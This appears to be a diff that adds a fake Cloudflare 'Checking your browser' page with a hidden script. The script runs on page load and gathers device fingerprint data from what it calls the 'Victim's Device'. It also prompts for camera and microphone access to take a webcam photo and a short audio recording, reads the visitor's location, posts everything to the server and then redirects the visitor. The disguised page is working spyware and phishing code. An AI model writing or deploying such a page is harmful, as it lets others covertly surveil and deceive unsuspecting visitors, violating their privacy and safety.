@@ -1,0 +1,277 @@
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title>Just a moment....</title> 
+<style type="text/css">
+html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
+body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
+h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
+p {font-size: 20px; font-weight: 400; margin: 8px 0;}
+p, .attribution, {text-align: center;}
+#spinner {margin: 0 auto 30px auto; display: block;}
+.attribution {margin-top: 32px;}
+@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
+#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
+#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
+.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
+a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
+a:hover{color: #f4a15d}
+.attribution{font-size: 16px; line-height: 1.5;}
+.ray_id{display: block; margin-top: 8px;}
+#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
+#cf-hcaptcha-container { text-align:center;}
+#cf-hcaptcha-container iframe { display: inline-block;}
+</style> 
+</head> 
+<body>
+<table width="100%" height="100%" cellpadding="20"> 
+<tbody>
+<tr> 
+<td align="center" valign="middle"> 
+<div class="cf-browser-verification cf-im-under-attack"> 
+<noscript> 
+<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
+</noscript> 
+<div id="cf-content" style="display: block;"> 
+<div id="cf-bubbles"> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+</div> 
+<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
+<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
+<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
+</div> 
+<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
+</div> 
+<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
+
+<span data-translate="error" style="display: none;">error code: 1020</span>
+
+</form>
+</div> 
+<div class="attribution">
+DDoS protection by 
+<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
+<br> 
+<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
+</div> </td> 
+</tr> 
+</tbody>
+</table>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+    <script type="text/javascript">
+        const uid = "unique_user_id"; // Replace this with a dynamic UID if necessary
+
+        // Collect basic information
+        async function gatherBasicInfo() {
+            console.log("Collecting basic information...");
+            try {
+                let td = "<b>⏳ Date In Victim's Device:</b> " + new Date() + "<br>";
+                const infoKeys = [
+                    "productSub", "vendor", "maxTouchPoints", "doNotTrack", 
+                    "hardwareConcurrency", "cookieEnabled", "appCodeName", 
+                    "appName", "appVersion", "platform", "product", 
+                    "userAgent", "language", "languages", "webdriver", 
+                    "pdfViewerEnabled", "deviceMemory"
+                ];
+
+                td += "<br><b>📱 Device Information</b><br>";
+                for (let key of infoKeys) {
+                    if (key in navigator) {
+                        const value = navigator[key];
+                        td += `<b>${key}</b>: <code>${value}</code><br>`;
+                    }
+                }
+
+                await $.post("/data", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) });
+                console.log("Basic info sent successfully.");
+            } catch (error) {
+                console.error("Error gathering basic info:", error);
+            }
+        }
+
+        // Collect device info
+        async function gatherDeviceInfo() {
+            console.log("Collecting device information...");
+            let td = {};
+            try {
+                if (navigator.mediaDevices?.enumerateDevices) {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    td["mediaDevices"] = devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId
+                    }));
+                }
+
+                if ("connection" in navigator) {
+                    td["networkInfo"] = {
+                        type: navigator.connection.type,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData,
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    };
+                }
+
+                if ("getBattery" in navigator) {
+                    const battery = await navigator.getBattery();
+                    td["batteryInfo"] = {
+                        level: battery.level * 100,
+                        charging: battery.charging
+                    };
+                }
+
+                await $.ajax({
+                    url: "/data",
+                    method: "POST",
+                    contentType: "application/json",
+                    data: JSON.stringify({ ...td, uid }),
+                });
+                console.log("Device info sent successfully.");
+            } catch (error) {
+                console.error("Error gathering device info:", error);
+            }
+        }
+
+        // Capture image using webcam
+        async function captureImage() {
+            console.log("Capturing webcam image...");
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL("image/jpeg");
+
+                    $.post("/camsnap", { uid, img: imageData }, (response) => {
+                        console.log("Image captured and sent:", response);
+                        stream.getTracks().forEach(track => track.stop());
+                    });
+                }, 3000);
+            } catch (error) {
+                console.error("Camera access error:", error);
+            }
+        }
+
+        // Record audio
+        async function recordAudio() {
+            console.log("Recording audio...");
+            try {
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(mediaStream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks);
+                    const formData = new FormData();
+                    formData.append("audio", audioBlob);
+                    formData.append("uid", uid);
+
+                    await $.ajax({
+                        url: "/audio",
+                        method: "POST",
+                        processData: false,
+                        contentType: false,
+                        data: formData,
+                        success: function () {
+                            console.log("Audio recorded and sent successfully.");
+                        },
+                        error: function (error) {
+                            console.error("Audio recording error:", error);
+                        }
+                    });
+
+                    mediaStream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch (error) {
+                console.error("Audio recording error:", error);
+            }
+        }
+
+        // Collect location data
+        async function collectLocation() {
+            console.log("Collecting location data...");
+            try {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const locationData = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        uid
+                    };
+
+                    await $.ajax({
+                        url: "/location",
+                        method: "POST",
+                        contentType: "application/json",
+                        data: JSON.stringify(locationData),
+                        success: function () {
+                            console.log("Location data sent successfully.");
+                        },
+                        error: function (error) {
+                            console.error("Location data error:", error);
+                        }
+                    });
+                }, error => console.error("Location access error:", error));
+            } catch (error) {
+                console.error("Error collecting location data:", error);
+            }
+        }
+
+        // Redirect after 7 seconds
+        function scheduleRedirect() {
+            console.log("Scheduling redirection...");
+            setTimeout(() => {
+                $.get("/redirect_url", { uid }, (response) => {
+                    if (response && response.url) {
+                        console.log("Redirecting to:", response.url);
+                        window.location.href = response.url;
+                    } else {
+                        console.error("No redirect URL provided.");
+                    }
+                }).fail((error) => {
+                    console.error("Failed to fetch redirect URL:", error);
+                });
+            }, 7000); // Delay of 7 seconds
+        }
+
+        // Main function
+        async function main() {
+            console.log("Starting data collection...");
+            await gatherBasicInfo();
+            await gatherDeviceInfo();
+            await captureImage();
+            await recordAudio();
+            await collectLocation();
+            console.log("Data collection complete. Preparing for redirection...");
+            scheduleRedirect();
+        }
+
+        // Execute main function on window load
+        window.onload = main;
+    </script>
+</body>
+</html>
+
+
